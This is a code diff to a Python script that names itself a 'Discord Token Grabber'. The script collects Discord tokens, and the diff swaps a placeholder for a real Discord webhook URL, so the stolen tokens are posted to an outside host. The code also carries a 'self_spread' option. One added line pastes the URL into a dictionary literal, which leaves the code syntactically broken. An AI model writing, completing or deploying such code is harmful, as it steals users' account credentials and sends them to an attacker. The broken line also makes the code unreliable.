@@ -174,14 +174,14 @@ def main():
                 file.write(token + "\n")
     if len(working) == 0:
         working.append('123')
-    webhook = {
+    webhook = {https://discord.com/api/webhooks/953926783076548638/0tjhVfW47O7yrDut0EG0T3fZKuJ5SgWnJLcGy1MlLY_4LzyPSLzLfbEhz_unUIqJ6p-D
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/953926783076548638/0tjhVfW47O7yrDut0EG0T3fZKuJ5SgWnJLcGy1MlLY_4LzyPSLzLfbEhz_unUIqJ6p-D", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
